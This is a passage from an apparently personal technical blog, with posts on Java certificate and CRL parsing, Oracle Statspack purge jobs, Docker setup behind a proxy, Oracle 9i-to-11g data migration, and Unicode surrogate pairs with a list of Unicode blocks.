class="line">                  if (value.indexOf(CERT_TYPE_ORGANIZATIONAL) != -1) &#123;</span><br><span class="line">                      certType = CERT_TYPE_ORGANIZATIONAL;</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                      certType = CERT_TYPE_PERSONAL;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              if (name.getType().equals(&quot;OU&quot;)) &#123;</span><br><span class="line">                  Pattern p = Pattern.compile(&quot;\\d+&quot;);</span><br><span class="line"></span><br><span class="line">                  if (p.matcher(value).matches()) &#123; // check digit</span><br><span class="line">                      if (value.length() &gt; 10) &#123;</span><br><span class="line">                          brc = value.substring(0, 8);</span><br><span class="line">                          brcBranchCode = value.substring(8, 11);</span><br><span class="line">                      &#125; else &#123;</span><br><span class="line">                          srn = value;</span><br><span class="line">                          session.setAttribute(&quot;CERT_SRC_NO&quot;, srn);</span><br><span class="line">                          System.out.println(&quot;srn &quot; + srn);</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              if (name.getType().equals(&quot;CN&quot;)) &#123;</span><br><span class="line">                  holdername = value;</span><br><span class="line">                  session.setAttribute(&quot;holdername&quot;, holdername);</span><br><span class="line">                  System.out.println(&quot;holdername: &quot; + holdername);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          System.out.println(&quot;certificate Type &quot; + certType);</span><br><span class="line"></span><br><span class="line">          if (certType.equals(CERT_TYPE_PERSONAL)) &#123;</span><br><span class="line">              if (!auth.checkHKID(userHKID)) &#123;</span><br><span class="line">                  errMsg = bundle.getString(ErrMsgConfig.ECERT00008);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>With oracle java api, it can be used to get crl path elegantly.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CRLDistributionPointsExtension crlDistributionPointsExtension = certificateImpl.getCRLDistributionPointsExtension();</span><br><span class="line"></span><br><span class="line">if (crlDistributionPointsExtension != null) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        for (DistributionPoint distributionPoint : ((List&lt;DistributionPoint&gt;) crlDistributionPointsExtension</span><br><span class="line">                .get(CRLDistributionPointsExtension.POINTS))) &#123;</span><br><span class="line">            for (GeneralName generalName : distributionPoint.getFullName().names()) &#123;</span><br><span class="line">                String generalNameString = generalName.toString();</span><br><span class="line">                System.out.println(generalNameString);</span><br><span class="line">                String crlURLString = generalNameString.substring(9);</span><br><span class="line">                crlUrl = new URL(crlURLString);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception ex) &#123;</span><br><span class="line">        throw new CertPathValidatorException(ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>But finally check whether CRL is revoked, just call <strong>crl.isrevoked</strong> to work. Damn!</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-stackpack" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-10-16T03:13:57.000Z"><a href="/2014/10/16/stackpack/">2014-10-16</a></time>
      
      
  
    <h1 class="title"><a href="/2014/10/16/stackpack/">stackpack</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><strong>Get all snapshot</strong></li>
</ul>
<p><code>select * from STATS$snapshot;</code></p>
<ul>
<li><p><strong>Check database instance</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from STATS$DATABASE_INSTANCE; – in case database restarted, an error will be thrown as ORA-20200: The instance was shutdown between snapshots 981 and 982</span><br><span class="line">select * from v$instance;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Run stackpack</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlplus perfstat/password@“(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=server)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=xxrac)))”</span><br><span class="line">@$ORACLE_HOME/rdbms/admin/spreport.sql</span><br><span class="line">OR</span><br><span class="line">@?/rdbms/admin/spreport.sql</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Purge stackpack</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@$ORACLE_HOME/rdbms/admin/sppurge.sql</span><br><span class="line">OR</span><br><span class="line">@?/rdbms/admin/sppurge.sql</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Oracle jobs</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user_jobs; SELECT job, next_date, next_sec, failures, broken, SUBSTR(what,1,40) DESCRIPTION FROM dba_jobs; </span><br><span class="line">EXEC dbms_job.broken(24, false); </span><br><span class="line">EXEC dbms_job.run(24, false); – reset job when failure 16 attemps to run</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Oracle job for schedule run sppurge</strong></p>
</li>
</ul>
<p>——————– Check the snap present before 20 days ——————–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from stats$snapshot where snap_time &lt; sysdate-20</span><br><span class="line"></span><br><span class="line">----Create the procedure which will purge statspack snapshot after 20 days gap---------</span><br><span class="line">create or replace procedure statspackpurge is</span><br><span class="line">var_lo_snap number;</span><br><span class="line">var_hi_snap number;</span><br><span class="line">var_db_id number;</span><br><span class="line">var_instance_no number;</span><br><span class="line">noofsnapshot number;</span><br><span class="line">n_count number ;</span><br><span class="line">begin</span><br><span class="line"></span><br><span class="line">n_count := 0;</span><br><span class="line"></span><br><span class="line">select count(*) into n_count from stats$snapshot where snap_time &lt; sysdate-20;</span><br><span class="line"></span><br><span class="line">if n_count &gt; 0 then</span><br><span class="line"></span><br><span class="line">select min(s.snap_id) , max(s.snap_id),max(di.dbid),max(di.instance_number) into  var_lo_snap, var_hi_snap,var_db_id,var_instance_no</span><br><span class="line">  from stats$snapshot s</span><br><span class="line">     , stats$database_instance di</span><br><span class="line"> where s.dbid              = di.dbid</span><br><span class="line">   and s.instance_number   = di.instance_number</span><br><span class="line">   and di.startup_time     = s.startup_time</span><br><span class="line">   and s.snap_time &lt; sysdate-20;</span><br><span class="line"></span><br><span class="line">  noofsnapshot := statspack.purge( i_begin_snap      =&gt; var_lo_snap</span><br><span class="line">                                      , i_end_snap        =&gt; var_hi_snap</span><br><span class="line">                                      , i_snap_range      =&gt; true</span><br><span class="line">                                      , i_extended_purge  =&gt; false</span><br><span class="line">                                      , i_dbid            =&gt; var_db_id</span><br><span class="line">                                      , i_instance_number =&gt; var_instance_no);</span><br><span class="line"></span><br><span class="line"> dbms_output.Put_line(&#x27;snapshot deleted&#x27;||to_char(noofsnapshot));</span><br><span class="line"></span><br><span class="line">end if;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>——————– check the job already exits in the database  ——————–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  job, next_date, next_sec, failures, broken, SUBSTR(what,1,40) DESCRIPTION FROM dba_jobs;</span><br></pre></td></tr></table></figure>

<p>——————– scheduled the  job at mid night ——————–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">  my_job number;</span><br><span class="line">begin</span><br><span class="line">  dbms_job.submit(job =&gt; my_job,</span><br><span class="line">    what =&gt; &#x27;statspackpurge;&#x27;,</span><br><span class="line">    next_date =&gt; trunc(sysdate)+1,</span><br><span class="line">    interval =&gt; &#x27;trunc(sysdate)+1&#x27;);</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
<p>————–  Another way———————————————————-</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">variable v_jobno number;</span><br><span class="line">begin</span><br><span class="line">dbms_job.submit(:v_jobno,&#x27;statspack.purge(i_num_days=&gt;15,i_extended_purge=&gt;TRUE);&#x27;,trunc(sysdate)+1+2/24,&#x27;SYSDATE&#x27;,TRUE);</span><br><span class="line">commit;</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
<ul>
<li>Reference</li>
</ul>
<p><strong>Stackpack</strong><br><a target="_blank" rel="noopener" href="http://www.oracle-base.com/articles/8i/statspack-8i.php">http://www.oracle-base.com/articles/8i/statspack-8i.php</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B10500_01/server.920/a96533/statspac.htm">http://docs.oracle.com/cd/B10500_01/server.920/a96533/statspac.htm</a></p>
<p><strong>Oracle job</strong><br><a target="_blank" rel="noopener" href="http://www.orafaq.com/wiki/DBMS_JOB">http://www.orafaq.com/wiki/DBMS_JOB</a><br><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/tips_oracle_statspack_purge_utility.htm">http://www.dba-oracle.com/tips_oracle_statspack_purge_utility.htm</a><br><a target="_blank" rel="noopener" href="http://myoracleworld.hobby-electronics.net/DB-statspack.html">http://myoracleworld.hobby-electronics.net/DB-statspack.html</a><br><a target="_blank" rel="noopener" href="http://dbaworks-sunny.blogspot.hk/2012/12/statspack-purge-script-for-scheduling.html">http://dbaworks-sunny.blogspot.hk/2012/12/statspack-purge-script-for-scheduling.html</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B19306_01/appdev.102/b14258/d_job.htm#i1000769">http://docs.oracle.com/cd/B19306_01/appdev.102/b14258/d_job.htm#i1000769</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Dive-Into-Docker" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-05-20T02:37:44.000Z"><a href="/2014/05/20/Dive-Into-Docker/">2014-05-20</a></time>
      
      
  
    <h1 class="title"><a href="/2014/05/20/Dive-Into-Docker/">Dive Into Docker</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Step"><a href="#Step" class="headerlink" title="Step"></a>Step</h1><ul>
<li>install VirtualBox-4.2.24-92790-Win.exe</li>
<li>check whether CPU is support virtualization technology with software cpu-z<br><a target="_blank" rel="noopener" href="http://www.mobile01.com/topicdetail.php?f=296&t=367606">1-3.CPU進階技術講解</a><br><a target="_blank" rel="noopener" href="http://ark.intel.com/products/75047/Intel-Core-i5-4670-Processor-6M-Cache-up-to-3_80-GHz">i5-4670</a><br><a target="_blank" rel="noopener" href="http://www.cpu-world.com/CPUs/Core_i5/Intel-Core%20i5-4670.html">i5-4670</a></li>
<li>enable vt-x in BIOS<br> <a target="_blank" rel="noopener" href="https://access.redhat.com/site/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Virtualization_Administration_Guide/sect-Virtualization-Troubleshooting-Enabling_Intel_VT_and_AMD_V_virtualization_hardware_extensions_in_BIOS.html">Enabling Intel VT-x and AMD-V virtualization hardware extensions in BIOS</a></li>
<li>run book2docker.iso in VirtualBox <a target="_blank" rel="noopener" href="http://docs.docker.io/installation/windows/">http://docs.docker.io/installation/windows/</a></li>
<li>set proxy and run docker <code>sudo HTTP_PROXY=http://192.168.56.1:21/ docker -d &amp;</code><br><a target="_blank" rel="noopener" href="http://2mohitarora.blogspot.hk/2014/02/docker-tip-if-you-are-running-docker.html">Docker Tip - If you are running docker behind proxy</a><br><a target="_blank" rel="noopener" href="https://github.com/dotcloud/docker/issues/402">Using Docker behind a firewall</a></li>
<li>pull busybox and base <code>docker pull busybox</code> <code>docker pull base</code></li>
<li><code>sudo docker run busybox echo hello wolrd</code></li>
<li><code>sudo docker run -i -t busybox /bin/bash</code></li>
</ul>
<h1 id="Ubuntu-14-04"><a href="#Ubuntu-14-04" class="headerlink" title="Ubuntu 14.04"></a>Ubuntu 14.04</h1><p>Host-only ethernet adapter in VirtualBox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openssh-server -y</span><br><span class="line">sudo apt-get install docker -y</span><br><span class="line">sudo ln /usr/bin/docker.io /usr/local/bin/docker</span><br><span class="line">sudo service docker.io stop</span><br><span class="line">sudo HTTP_PROXY=http://192.168.56.1:21/</span><br><span class="line">docker -d &amp;</span><br><span class="line">alias d=&#x27;sudo docker&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><ul>
<li>apt-get<br> create a file named proxy in <code>/etc/apt/apt.conf.d/</code> as below,<br> <code>Acquire::http::Proxy “http://192.168.56.1:21”;</code></li>
<li>git<br> <code>git config –global http.proxy http://192.168.56.1:21</code></li>
<li>wget<br> <code>/etc/wgetrc -&gt; http_proxy = http://192.168.56.1:21</code></li>
<li>docker<br> <code>sudo HTTP_PROXY=http://192.168.56.1:21/ docker.io -d &amp;</code></li>
<li>curl<br> <code>export http_proxy=http://192.168.56.1:21/ </code><br> <code>export https_proxy=http://192.168.56.1:21/</code></li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://serverascode.com/2014/03/26/boot2docker.html">boot2docker</a><br><a target="_blank" rel="noopener" href="http://zaiste.net/2014/02/lightweight_docker_experience_on_osx/">lightweight_docker_experience_on_osx</a><br><a target="_blank" rel="noopener" href="http://docs.docker.io/use/basics/">docs.docker.io</a><br><a target="_blank" rel="noopener" href="http://www.dockerbook.com/TheDockerBook_sample.pdf">TheDockerBook_sample</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Migration" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-05-05T01:01:13.000Z"><a href="/2014/05/05/Migration/">2014-05-05</a></time>
      
      
  
    <h1 class="title"><a href="/2014/05/05/Migration/">Migration</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>#Call external bat (do not use cmd &#x2F;c) and substring in bat file </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call C:\Production_ATV_Windows_LD\ATV.bat -L &gt; filename.txt</span><br><span class="line"></span><br><span class="line">FOR /F &quot;tokens=2 delims=][&quot; %%i in (filename.txt) do set today=%%i</span><br><span class="line"></span><br><span class="line">call C:\Production_ATV_Windows_LD\ATV.bat -DD -FilePre %today% -Overwrite</span><br><span class="line"></span><br><span class="line">rem set today=PPSC140429</span><br><span class="line">set today=%today:~0,10% </span><br><span class="line">#Export/Import data from oracle 9i to oracle11g </span><br></pre></td></tr></table></figure>

<ul>
<li>export NLS_LANG&#x3D;TRADITIONAL CHINESE_HONG KONG.AL32UTF8 </li>
<li>export schema : exp usr&#x2F;passwd@uatrac file&#x3D;db.dmp ROWS&#x3D;N log&#x3D;db.log </li>
<li>edit db.dmp and change tablespace from ABC to XYZ </li>
<li>import schema : imp usr&#x2F;passwd@prdrac file&#x3D;db.dmp log&#x3D;db.log </li>
<li>export data : exp usr&#x2F;passwd@uatrac tables&#x3D;ABC file&#x3D;db.dmp INDEXES&#x3D;N CONSTRAINTS&#x3D;N GRANTS&#x3D;N ROWS&#x3D;Y log&#x3D;db.log </li>
<li>disable insert triggers </li>
<li>import data : imp usr&#x2F;passwd@prdrac file&#x3D;data.dmp IGNORE&#x3D;Y INDEXES&#x3D;N CONSTRAINTS&#x3D;N GRANTS&#x3D;N ROWS&#x3D;Y fromUser&#x3D;abc toUser&#x3D;xyz commit&#x3D;y buffer&#x3D;1024000 log&#x3D;db.log</li>
</ul>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Some-findings-on-studying-surrogate-pair" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-03-20T07:48:47.000Z"><a href="/2014/03/20/Some-findings-on-studying-surrogate-pair/">2014-03-20</a></time>
      
      
  
    <h1 class="title"><a href="/2014/03/20/Some-findings-on-studying-surrogate-pair/">Some findings on studying surrogate pair</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="HKSCS"><a href="#HKSCS" class="headerlink" title="HKSCS"></a>HKSCS</h1><p><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/library/j-unicode/">Unicode surrogate programming with the Java language</a><br><a target="_blank" rel="noopener" href="http://www.fmddlmyy.cn/text6.html">谈Unicode编码，简要解释UCS、UTF、BMP、BOM等名词</a><br><a target="_blank" rel="noopener" href="http://hkitf.org.hk/wp-content/uploads/2010/07/HKSCS-2004-Support-for-Windows-Platform-v1.0.pdf">HKSCS-2004 Support for Windows Platform</a><br><a target="_blank" rel="noopener" href="http://www.iso10646.hkpc.org/en_ProductInfo.asp?code=0000000187">「HKSCS compatibility」– 香港字集兼容方案 </a><br><a target="_blank" rel="noopener" href="http://www.ogcio.gov.hk/en/business/tech_promotion/ccli/terms/doc/e_hkscs_2004.pdf">Hong Kong Supplementary Character Set - 2004</a><br><a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/HKSCS">HKSCS</a><br><a target="_blank" rel="noopener" href="http://forum.moztw.org/viewtopic.php?t=25606&start=45">HKSCS 字碼表</a><br><a target="_blank" rel="noopener" href="http://www.hkepc.com/forum/viewthread.php?tid=1400791">Win7 睇香港字問題</a><br><a target="_blank" rel="noopener" href="http://www.hkepc.com/forum/viewthread.php?tid=1910568">關於Windows 7用code page 951既問題</a><br><a target="_blank" rel="noopener" href="http://infocenter.sybase.com/help/topic/com.sybase.infocenter.dc30020.1550/pdf/xmlb.pdf">XML Services</a><br><a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Mapping_of_Unicode_characters#Surrogates">Universal Character Set characters - Surrogates</a><br><a target="_blank" rel="noopener" href="http://www.herongyang.com/Unicode/Block-U20000-CJK-Unified-Ideographs-Extension-B.html">Block-U20000-CJK-Unified-Ideographs-Extension-B</a><br><a target="_blank" rel="noopener" href="http://www.unicode.org/versions/Unicode5.2.0/ch02.pdf#G11178">Unicode5.2.0</a><br><a target="_blank" rel="noopener" href="http://java.chinaitlab.com/base/845897_2.html">Java中的字符集编码入门技巧</a><br><a target="_blank" rel="noopener" href="http://me.abelcheung.org/devel/chinese/hkscs-2004-conversion-script/">Chinese &#x2F; HKSCS 2004 conversion script</a></p>
<h1 id="Surrogate"><a href="#Surrogate" class="headerlink" title="Surrogate"></a>Surrogate</h1><p><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/625018/why-utf-32-instead-of-utf-16-if-we-have-surrogate-pairs">Why UTF-32 instead of UTF-16 if we have surrogate pairs?</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/965838/handling-unicode-surrogate-values-in-java-strings">handling-unicode-surrogate-values-in-java-strings</a><br><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/5903008/what-is-a-surrogate-pair-in-java">what-is-a-surrogate-pair-in-java</a><br><a target="_blank" rel="noopener" href="http://hualong.iteye.com/blog/919220">Java中的字符集编码入门（六）Java中的增补字符</a></p>
<h1 id="XMLBeans-Related"><a href="#XMLBeans-Related" class="headerlink" title="XMLBeans Related"></a>XMLBeans Related</h1><p><a target="_blank" rel="noopener" href="http://piccolo.sourceforge.net/">Piccolo XML Parser for Java</a></p>
<h1 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000010 00100100 01100101</span><br><span class="line">10001011 10111001</span><br></pre></td></tr></table></figure>

<p>28BB9</p>
<h1 id="►Unicode-Code-Point-Blocks-Code-Charts"><a href="#►Unicode-Code-Point-Blocks-Code-Charts" class="headerlink" title="►Unicode Code Point Blocks - Code Charts"></a>►Unicode Code Point Blocks - Code Charts</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line">U0000: C0 Controls and Basic Latin</span><br><span class="line">U0080: C1 Controls and Latin-1 Supplement</span><br><span class="line">U0100: Latin Extended-A</span><br><span class="line">U0180: Latin Extended-B</span><br><span class="line">U0250: IPA Extensions</span><br><span class="line">U02B0: Spacing Modifier Letters</span><br><span class="line">U0300: Combining Diacritical Marks</span><br><span class="line">U0370: Greek and Coptic</span><br><span class="line">U0400: Cyrillic</span><br><span class="line">U0500: Cyrillic Supplement</span><br><span class="line">U0530: Armenian</span><br><span class="line">U0590: Hebrew</span><br><span class="line">U0600: Arabic</span><br><span class="line">U0700: Syriac</span><br><span class="line">U0750: Arabic Supplement</span><br><span class="line">U0780: Thaana</span><br><span class="line">U07C0: NKo</span><br><span class="line">U0800: Samaritan</span><br><span class="line">U0840: Mandaic</span><br><span class="line">U08A0: Arabic Extended-A</span><br><span class="line">U0900: Devanagari</span><br><span class="line">U0980: Bengali</span><br><span class="line">U0A00: Gurmukhi</span><br><span class="line">U0A80: Gujarati</span><br><span class="line">U0B00: Oriya</span><br><span class="line">U0B80: Tamil</span><br><span class="line">U0C00: Telugu</span><br><span class="line">U0C80: Kannada</span><br><span class="line">U0D00: Malayalam</span><br><span class="line">U0D80: Sinhala</span><br><span class="line">U0E00: Thai</span><br><span class="line">U0E80: Lao</span><br><span class="line">U0F00: Tibetan</span><br><span class="line">U1000: Myanmar</span><br><span class="line">U10A0: Georgian</span><br><span class="line">U1100: Hangul Jamo</span><br><span class="line">U1200: Ethiopic</span><br><span class="line">U1380: Ethiopic Supplement</span><br><span class="line">U13A0: Cherokee</span><br><span class="line">U1400: Unified Canadian Aboriginal Syllabics</span><br><span class="line">U1680: Ogham</span><br><span class="line">U16A0: Runic</span><br><span class="line">U1700: Tagalog</span><br><span class="line">U1720: Hanunoo</span><br><span class="line">U1740: Buhid</span><br><span class="line">U1760: Tagbanwa</span><br><span class="line">U1780: Khmer</span><br><span class="line">U1800: Mongolian</span><br><span class="line">U18B0: 